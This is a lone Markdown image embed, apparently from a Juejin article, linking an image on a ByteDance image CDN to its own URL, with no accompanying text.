[![](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/df9fac863da544edbc302f4a77ae85bd~tplv-k3u1fbpfcp-zoom-1.image)](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/df9fac863da544edbc302f4a77ae85bd~tplv-k3u1fbpfcp-zoom-1.image)
